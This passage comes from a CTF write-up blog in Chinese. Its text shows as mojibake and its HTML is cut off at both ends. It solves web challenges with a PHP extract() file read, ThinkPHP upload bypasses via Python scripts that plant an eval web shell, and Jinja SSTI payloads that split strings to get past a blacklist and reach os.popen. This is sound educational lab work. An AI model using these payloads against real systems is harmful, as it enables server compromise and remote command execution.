class="hljs-variable">$_REQUEST</span>;<br><span class="hljs-variable">$userModel</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserModel</span>();<br><span class="hljs-variable">$listData</span> = <span class="hljs-variable">$userModel</span>-&gt;<span class="hljs-title function_ invoke__">getPageList</span>(<span class="hljs-variable">$params</span>);<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadView</span>(<span class="hljs-string">&#x27;userList&#x27;</span>, <span class="hljs-variable">$listData</span> );<br>&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionIndex</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$listData</span> = <span class="hljs-variable">$_REQUEST</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadView</span>(<span class="hljs-string">&#x27;userIndex&#x27;</span>,<span class="hljs-variable">$listData</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>actionIndex</code>æ–¹æ³•ä¸­çš„<code>$listData</code>å®Œå…¨å¯æ§ï¼Œå»<code>userIndex.php</code>çœ‹çœ‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$img_file</span>)) &#123;<br>                    <span class="hljs-variable">$img_file</span> = <span class="hljs-string">&#x27;/../favicon.ico&#x27;</span>;<br>                &#125;<br>                <span class="hljs-variable">$img_dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-variable">$img_file</span>;<br>                <span class="hljs-variable">$img_base64</span> = <span class="hljs-title function_ invoke__">imgToBase64</span>(<span class="hljs-variable">$img_dir</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="hljs-variable">$img_base64</span> . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;       <span class="hljs-comment">//å›¾ç‰‡å½¢å¼å±•ç¤º</span><br>                <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è€ƒè™‘åˆ°<code>loadview</code>æ–¹æ³•ä¸­å­˜åœ¨<code>extract</code>ï¼Œç›´æ¥<code>GET</code>æˆ–<code>POST</code>ä¼ <code>img_file=/../flag</code>å°±è¡Œã€‚</p><p>æ³¨æ„<code>fun.php</code>ä¸‹è¿™ä¸ªè·¯ç”±æ§åˆ¶è·³è½¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>]);<br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$controller</span>,<span class="hljs-variable">$action</span>) = <span class="hljs-variable">$r</span>;<br><span class="hljs-variable">$controller</span> = <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$controller&#125;</span>Controller&quot;</span>;<br><span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;action<span class="hljs-subst">&#123;$action&#125;</span>&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$controller</span>))<br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$controller</span>,<span class="hljs-variable">$action</span>))<br>&#123;<br><span class="hljs-comment">//</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;actionIndex&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$controller</span> = <span class="hljs-string">&quot;LoginController&quot;</span>;<br>        <span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;actionIndex&quot;</span>;<br>&#125;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">array</span>( (<span class="hljs-keyword">new</span> <span class="hljs-variable">$controller</span>), <span class="hljs-variable">$action</span>));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:index.php?r=Login/Index&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>payload</code>:<code>index.php?r=User/Index&amp;img_file=/../flag.php</code></p><h4 id="æ€è·¯æ€»ç»“-3"><a href="#æ€è·¯æ€»ç»“-3" class="headerlink" title="æ€è·¯æ€»ç»“:"></a>æ€è·¯æ€»ç»“:</h4><p><code>index.php</code>ä¼šåŒ…å«<code>fun.php</code>ï¼Œ<code>fun.php</code>ä¸‹ä¼šå¯¹<code>$_REQUEST[&#39;r&#39;]</code>å¾—åˆ°çš„å‚æ•°ä»¥<code>/</code>åˆ†å‰²ï¼š<code>$controller,$action</code>æ¥è°ƒç”¨æŒ‡å®š<code>controller</code>ä¸‹çš„æŒ‡å®šæ–¹æ³•ã€‚ç„¶åé€šè¿‡<code>extract</code>å»è¦†ç›–<code>$img_file</code>çš„å€¼ï¼ŒæŠŠç»“æœä»¥<code>base64</code>å½¢å¼è¾“å‡ºã€‚</p><p>å¯¹äº<code>REQUEST</code>è¿™ç§è¶…å…¨å±€å˜é‡ï¼ŒGETPOSTä¼ éƒ½è¡Œã€‚</p><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>è°ƒç”¨Thinkphpæ¡†æ¶ä¸Šä¼ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Home</span>\<span class="hljs-title class_">Controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ;<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$uploadFile</span>[<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>) ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$upload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Think\Upload</span>();<span class="hljs-comment">// å®ä¾‹åŒ–ä¸Šä¼ ç±»</span><br>        <span class="hljs-variable">$upload</span>-&gt;maxSize  = <span class="hljs-number">4096</span> ;<span class="hljs-comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å°</span><br>        <span class="hljs-variable">$upload</span>-&gt;allowExts  = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>);<span class="hljs-comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹</span><br>        <span class="hljs-variable">$upload</span>-&gt;rootPath = <span class="hljs-string">&#x27;./Public/Uploads/&#x27;</span>;<span class="hljs-comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½•</span><br>        <span class="hljs-variable">$upload</span>-&gt;savePath = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½•</span><br>        <span class="hljs-variable">$info</span> = <span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>() ;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$info</span>) &#123;<span class="hljs-comment">// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯</span><br>          <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">getError</span>());<br>          <span class="hljs-keyword">return</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</span><br>          <span class="hljs-variable">$url</span> = __ROOT__.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$upload</span>-&gt;rootPath,<span class="hljs-number">1</span>).<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savepath&#x27;</span>].<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savename&#x27;</span>] ;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;url&quot;</span>=&gt;<span class="hljs-variable">$url</span>,<span class="hljs-string">&quot;success&quot;</span>=&gt;<span class="hljs-number">1</span>));<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>è¿™é¢˜å®Œå…¨ä¸ä¼šåšã€‚ã€‚ã€‚<a href="https://mayi077.gitee.io/2020/04/23/RoarCTF-2019-Simple-Upload/">å‚è€ƒèµ„æ–™1</a></p><p><a href="https://inanb.github.io/2021/09/15/RoarCTF-2019-Simple-Upload/">å‚è€ƒèµ„æ–™2</a></p><p>thinkphpä¸­uploadç±»çš„uploadæ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * ä¸Šä¼ å•ä¸ªæ–‡ä»¶</span><br><span class="hljs-comment">   * <span class="hljs-doctag">@param</span>  array  $file æ–‡ä»¶æ•°ç»„</span><br><span class="hljs-comment">   * <span class="hljs-doctag">@return</span> array        ä¸Šä¼ æˆåŠŸåçš„æ–‡ä»¶ä¿¡æ¯</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadOne</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-variable">$info</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$file</span>));<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable">$info</span> ? <span class="hljs-variable">$info</span>[<span class="hljs-number">0</span>] : <span class="hljs-variable">$info</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * ä¸Šä¼ æ–‡ä»¶</span><br><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> æ–‡ä»¶ä¿¡æ¯æ•°ç»„ $files ï¼Œé€šå¸¸æ˜¯ $_FILESæ•°ç»„</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$files</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;&#x27;</span> === <span class="hljs-variable">$files</span>) &#123;<br>          <span class="hljs-variable">$files</span> = <span class="hljs-variable">$_FILES</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$files</span>)) &#123;<br>          <span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-string">&#x27;æ²¡æœ‰ä¸Šä¼ çš„æ–‡ä»¶ï¼&#x27;</span>;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<br>........<br>      ........<br>  &#125;<br><br></code></pre></td></tr></table></figure><p>æ— å‚è°ƒç”¨æ—¶ï¼Œ$fileså°†ä¸ºç©ºä¸²ï¼Œä¸”ä¼ å…¥<code>$_FILES</code>æ•°ç»„ï¼Œå³å¤šæ–‡ä»¶ä¸Šä¼ ã€‚è€Œä¸”æ³¨æ„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ;<br>       <br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$uploadFile</span>[<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>) ) &#123;<br></code></pre></td></tr></table></figure><p>è¿™ä¸œè¥¿åªæ£€æµ‹<code>file</code>å‚æ•°çš„å€¼ï¼Œå¦‚æœä¸Šä¼ <code>file1</code>ä¹‹ç±»çš„å‚æ•°ä»–å¹¶ä¸ä¼šæ£€æµ‹åç¼€ã€‚</p><p>ä½†ç›´æ¥ä¸Šä¼ é<code>file</code>å‚æ•°è‚¯å®šä¸è¡Œï¼Œå› ä¸ºä¸Šä¼ åè¿”å›çš„æ–‡ä»¶ä¿¡æ¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$url</span> = __ROOT__.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$upload</span>-&gt;rootPath,<span class="hljs-number">1</span>).<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savepath&#x27;</span>].<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savename&#x27;</span>] ;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;url&quot;</span>=&gt;<span class="hljs-variable">$url</span>,<span class="hljs-string">&quot;success&quot;</span>=&gt;<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯<code>file</code>å‚æ•°çš„ä¿¡æ¯ï¼Œè€Œä¸”ä¸Šä¼ åçš„æ–‡ä»¶åæ˜¯æ ¹æ®<code>uniqid</code>ç”Ÿæˆçš„ã€‚</p><p>æ‰€ä»¥è§£é¢˜æ€è·¯å°±æ˜¯ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ï¼Œé¡ºåºï¼š<code>file</code>,<code>éfile</code>.<code>file</code>ã€‚é€šè¿‡çˆ†ç ´å‰åä¸¤ä¸ª<code>file</code>ä¹‹é—´çš„<code>uniqid</code>æ¥ç¡®å®šä¸Šä¼ çš„<code>éfile</code>æ–‡ä»¶åæ˜¯å¤šå°‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://24777c04-c0bf-474f-9ab7-ff68a98e3172.node5.buuoj.cn:81//index.php/home/index/upload&#x27;</span><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)&#125;<br>files2=&#123;<span class="hljs-string">&#x27;file[]&#x27;</span>:(<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files2)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br></code></pre></td></tr></table></figure><p><img src="/img/ximpleuploadd1.png" alt="ximpleuploadd1"></p><p>æ³¨æ„è¿™é‡Œ<code>files = files</code>ï¼Œ<code>files</code>æ˜¯<code>post</code>ä¸­ä¸“é—¨ç”¨äºä¸Šä¼ æ–‡ä»¶çš„å‚æ•°ã€‚</p><p>å¦‚æœä¸ç”¨<code>file[]</code>è¿™ç§å‚æ•°ï¼Œç›´æ¥ä¸Šä¼ <code>php</code>æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://24777c04-c0bf-474f-9ab7-ff68a98e3172.node5.buuoj.cn:81//index.php/home/index/upload&#x27;</span><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)&#125;<br>files2=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files2)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br></code></pre></td></tr></table></figure><p><img src="/img/ximpleuploadd2.png" alt="ximpleuploadd2"></p><p>å…¶å®åšè¿™é¢˜åšçš„ä¸æ˜¯å¾ˆæ˜ç™½ã€‚ã€‚æˆ‘çœ‹æœ‰äº›å¸ˆå‚…è¯´åŒæ—¶ä¸Šä¼ å¤šä¸ªæ–‡ä»¶å°±èƒ½ç»•è¿‡å¯¹<code>php</code>åç¼€çš„æ£€æµ‹ã€‚ã€‚ä½†è¿™é‡Œæ˜¯å’Œå‚æ•°åæ˜¯å¦æ˜¯<code>file</code>æœ‰å…³ï¼Ÿ</p><p>ç¬¬äºŒç§è§£æ³•å°±æ˜¯åˆ©ç”¨<code>strip_tags</code>å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$file</span>) &#123;<br>      <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]  = <span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>      <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;key&#x27;</span>] = <span class="hljs-variable">$key</span>;<br>       <span class="hljs-comment">/* é€šè¿‡æ‰©å±•è·å–æ–‡ä»¶ç±»å‹ï¼Œå¯è§£å†³FLASHä¸Šä¼ $FILESæ•°ç»„è¿”å›æ–‡ä»¶ç±»å‹é”™è¯¯çš„é—®é¢˜ */</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$finfo</span>))&#123;<br>                <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;type&#x27;</span>]   =   <span class="hljs-title function_ invoke__">finfo_file</span> ( <span class="hljs-variable">$finfo</span> ,  <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>] );<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨<code>strip_tags</code>å¯¹æ–‡ä»¶åè¿›è¡Œäº†å¤„ç†ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šä¼ <code>ä»»æ„.&lt;&gt;php</code>ç»å¤„ç†åå˜æˆ<code>ä»»æ„.php</code>å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  requests<br><br>url = <span class="hljs-string">&quot;http://24777c04-c0bf-474f-9ab7-ff68a98e3172.node5.buuoj.cn:81//index.php/home/index/upload&quot;</span><br><br>files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;1.&lt;&gt;php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r=requests.post(url=url,files=files)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="æ€è·¯æ€»ç»“-4"><a href="#æ€è·¯æ€»ç»“-4" class="headerlink" title="æ€è·¯æ€»ç»“"></a>æ€è·¯æ€»ç»“</h4><p><code>thinkphp</code>æ–‡ä»¶ä¸Šä¼ ï¼Ÿ</p><h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><h2 id="GWCTF-2019-ä½ çš„åå­—"><a href="#GWCTF-2019-ä½ çš„åå­—" class="headerlink" title="[GWCTF 2019]ä½ çš„åå­—"></a>[GWCTF 2019]ä½ çš„åå­—</h2><p><code>SSTI</code>ï¼Œè¾“å…¥<code>&#123;&#123;7*7&#125;&#125;</code>ä¼šæŠ¥é”™ï¼š</p><p>![GWCTF 2019yourname1](img&#x2F;GWCTF 2019yourname1.png)</p><p>çœ‹äº†è¿™ä¸ªæŠ¥é”™æˆ‘è¿˜ä»¥ä¸ºä¸æ˜¯<code>SSTI</code>ã€‚ã€‚</p><p>è¿‡æ»¤äº†åŒæ‹¬å·ï¼Œ<code>&#123;%print (7*7)%&#125;</code>å‘ç°èƒ½æ‰§è¡Œã€‚</p><p>ç½‘ä¸Šæ¯”è¾ƒå¸¸è§çš„wpè¿™ä¹ˆå†™çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">print</span> lipsum.__globals__[<span class="hljs-string">&#x27;__bui&#x27;</span>+<span class="hljs-string">&#x27;ltins__&#x27;</span>][<span class="hljs-string">&#x27;__im&#x27;</span>+<span class="hljs-string">&#x27;port__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)[<span class="hljs-string">&#x27;po&#x27;</span>+<span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;å‘½ä»¤&#x27;</span>).read()%&#125;<br></code></pre></td></tr></table></figure><p><code>&#123;%%&#125;</code>è¿™ä¸œè¥¿å¾ˆå¥½ç†è§£ï¼Œè¿‡æ»¤åŒæ‹¬å·åæ¯”è¾ƒå¸¸è§çš„ç»•è¿‡æ–¹æ³•ã€‚ä¸è¿‡ä¸€å¼€å§‹ä¸çŸ¥é“<code>lipsum</code>è¿™ä¸œè¥¿æ˜¯ä¸ªå•¥ã€‚æŸ¥äº†ä¸€ä¸‹<code>lipsum</code>è¿™ä¸œè¥¿æ˜¯flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥å’Œ<code>__globals__</code>é…åˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br></code></pre></td></tr></table></figure><p>æ—¢ç„¶æœ‰ç°æˆçš„æ–¹æ³•å°±ä¸éœ€è¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">1</span>].__init__.<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥è¿™ä¹ˆå†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">print</span> lipsum.__globals__.__builconfigtins__.__impoconfigrt__(<span class="hljs-string">&#x27;oconfigs&#x27;</span>).poconfigpen(<span class="hljs-string">&#x27;å‘½ä»¤&#x27;</span>).read()%&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ–¹æ³•å‘æ¶‰åŠåˆ°æºç ä¸­çš„è¿‡æ»¤æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist = [<span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;subclasses&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;args&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span 